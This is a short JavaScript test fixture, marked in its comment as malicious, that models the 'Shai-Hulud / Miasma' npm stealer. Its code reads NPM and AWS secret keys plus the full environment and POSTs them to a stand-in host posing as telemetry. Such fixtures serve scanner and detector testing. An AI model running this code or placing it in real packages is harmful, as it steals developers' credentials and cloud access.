// MALICIOUS FIXTURE — do not run. Models the Shai-Hulud / Miasma stealer:
// read credentials from the environment and exfiltrate over the network.
const https = require('https');

const stolen = {
  npmToken: process.env.NPM_TOKEN,
  awsKey: process.env.AWS_SECRET_ACCESS_KEY,
  env: process.env,
};

const req = https.request({
  host: 'telemetry-collect.example-evil.com',
  method: 'POST',
  path: '/ingest',
});
req.write(JSON.stringify(stolen));
req.end();
